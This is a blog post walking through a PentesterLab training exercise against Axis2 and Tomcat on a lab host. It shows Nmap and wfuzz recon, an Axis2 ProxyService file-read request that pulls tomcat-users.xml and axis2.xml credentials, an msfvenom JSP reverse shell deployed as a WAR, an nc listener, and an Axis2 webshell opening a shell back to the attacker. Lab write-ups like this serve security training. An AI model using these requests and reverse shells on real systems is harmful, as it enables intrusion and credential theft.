
<!DOCTYPE HTML>
<html>
<head>
	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
	<meta charset="utf-8">
	<title>Pentesterlab--Axis2 Web service and Tomcat Manager   | Bob1Bob2</title>

<meta name="author" content="Bob1Bob2"> 

<meta name="description" content="When you engage in actual fighting, if victory is long in coming, then men&rsquo;s weapons will grow dull and their ardor will be damped. If you lay &hellip;"> <meta name="keywords" content="">

	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="Bob1Bob2" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>

<script language="Javascript" type="text/javascript">
$(document).ready(
  function() {
    (function($) {
      $(".fancybox[data-content-id]").each(function() {
        this.href = $(this).data('content-id');
      });
      $(".fancybox").fancybox({
        beforeLoad: function() {
          var el, 
              id = $(this.element).data('title-id');

          if (id) {
            el = $('#' + id);

            if (el.length) {
              this.title = el.html();
            }
          }
          if ($(this).data('content')) {
            this.content = $(this).data('content');
          }
        },
        helpers: {
          title: {
            type: 'inside'
          }
        }
      });
    })(jQuery);
  }
);
</script>

	
</head>



<body>
	<header id="header" class="inner"><h1><a href="/">Bob1Bob2</a></h1>
<h4>Pen Test Notes</h4>
<nav id="main-nav"><ul>
	<li><a href="/">Blog</a></li>
	<li><a href="/about">About</a></li>
	<li><a href="/portfolio">Portfolio</a></li>
	<li><a href="/archives">Archive</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul>
	<li><a href="/">Blog</a></li>
	<li><a href="/about">About</a></li>
	<li><a href="/portfolio">Portfolio</a></li>
	<li><a href="/archives">Archive</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:wg135.github.io">
			</form>
		</div>
	</div>
</nav>


</header>

	<div id="content" class="inner"><article class="post">
	<h2 class="title">Pentesterlab--Axis2 Web Service and Tomcat Manager</h2>
	<div class="entry-content"><p><em>When you engage in actual fighting, if victory is long in coming, then men&rsquo;s weapons will grow dull and their ardor will be damped. If you lay siege to a town, you will exhaust your strength.</em> &mdash;&ndash; The Art of War</p>

<p>This course details the exploitation of an issue in an Axis2 Web service and how using this issue it is possible to retrieve arbitrary files. Then using this, we will see how an attacker can retrieve Tomcat users' file to access the Tomcat Manager and gain commands execution on the server. &mdash;Pentesterlab</p>

<p>Difficluty: 3/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>wfuzz</li>
<li>nc</li>
<li>msfvenom</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
<li>Burte force hidden path of the server. &mdash;-wfuzz</li>
<li>generate webshell. &mdash;msfvenom</li>
<li>backdoor. &mdash;nc</li>
<li>webshell. &mdash;Car.arr</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><code>nmap -sV -v -A 192.168.79.168</code></p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>Use wfuzz to burte force hidden path of the server</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>


<p><img src="/images/blog/pentesterlab/axis2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Now we find that the server host a web service using Axis2.</p>

<p>In order to test is the web server using Tomcat, we can try to visit a non-existing web page and watch the 404 error page.</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Now we find the server uses Tomcat and we get the version of the Tomcat. Keep going&hellip;</p>

<p>Lets check the path axis2/ , we get the page:</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>get the list of the available services by visiting the page <code>http://192.168.79.168/axis2/services/listServices</code> or click the serices link</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>The WSDL information can be accessed by clicking the service&rsquo;s name in the listServices page or directly using the following URL: <code>http://192.168.79.168/axis2/services/ProxyService?wsdl</code>.</p>

<p>We can see that <code>get</code> operation is defined in WSDL</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>Axis2 provides an easy way to call Web services, you just need to follow the pattern <a href="http://">http://</a>[WS_URL]/method?parameters</p>

<h4>Attack</h4>

<h4>Easy way</h4>

<p>Get Tomcat manager configuration to get login credentials.
In Debian Linux, the tomcat configuration file tomcat-users.xml has default location: /etc/tomcat6/tomcat-users.xml</p>

<p>So we can try:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.79.168/axis2/services/ProxyService/get?uri=file:///etc/tomcat6/tomcat-users.xml</span></code></pre></td></tr></table></div></figure>


<p>Then we get the Tomcat manager&rsquo;s credentials:</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>the tomcat manager-gui login password can be found: username: manager password: !mp0ss!bl32gu355</p>

<p>Then login tomcat manager from the URL <a href="http://192.168.79.168/manager/html">http://192.168.79.168/manager/html</a> to upload and deploy JSP webshell in WAR file.</p>

<h4>deploy webshell</h4>

<p>Generate webshell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir webshell
</span><span class='line'>$ cd webshell
</span><span class='line'>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.79.156 LPORT=4444 -f raw &gt; sh4.jsp
</span><span class='line'>$ jar -cvf ../webshell.war *
</span></code></pre></td></tr></table></div></figure>


<p>Then uplpad the websehll.war to manager page</p>

<p>in Kali setup nc:</p>

<p><code>nc -nlvp 4444</code></p>

<p>go to <code>http://192.168.79.168/webshell/sh4.jsp</code></p>

<p>then you will get the shell:</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<h4>&lsquo;Hard&rsquo; way</h4>

<p>In Debian Linux, the axis2 configuration file axis2.xml has default location: <code>/var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</code></p>

<p>so we can visit this page by using,</p>

<p><code>http://192.168.79.168/axis2/services/ProxyService/get?uri=file:///var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</code></p>

<p>from axis2.xml, we find the credential is admin/axis2</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>Then login axis2 admin page from the URL <code>http://192.168.79.168/axis2/axis2-admin/</code></p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>then try to upload webshell.war we used in last method.</p>

<p><img src="/images/blog/pentesterlab/axis2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like it doesn&rsquo;t support the war file format. WTF, okay, try harder.</p>

<p>After google search, I found a webshell for axis2,  called <a href="https://github.com/tennc/webshell/tree/master/other/cat.aar">Cat.arr</a></p>

<p>Download it and upload it to the server, it requres host IP and port number:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.79.168/axis2/services/Cat/shell?host=192.168.79.156&port=6666</span></code></pre></td></tr></table></div></figure>


<p><img src="/images/blog/pentesterlab/axis2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>Oh&hellip;..</p>

<p><img src="/images/blog/pentesterlab/axis2/gameover.jpeg" title="[title manually exploit [alt text]]" ></p>
</div>


<div class="meta">
	<div class="date">








  


<time datetime="2016-04-05T14:46:46-05:00" pubdate data-updated="true">2016-04-05 14:46:46 -0500</time></div>
	

<div class="tags">

	<a class='category' href='/blog/categories/apache/'>apache</a>, <a class='category' href='/blog/categories/axis2/'>axis2</a>, <a class='category' href='/blog/categories/pentesterlab/'>pentesterlab</a>, <a class='category' href='/blog/categories/tomcat/'>tomcat</a>

</div>


	
</div></article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
	
	
	<a class="addthis_button_tweet"></a>
	
	
<!---	<a class="addthis_counter addthis_pill_style"></a> --->
	</div>
  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2018

    Bob1Bob2

<br>
Powered by Octopress.
</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>
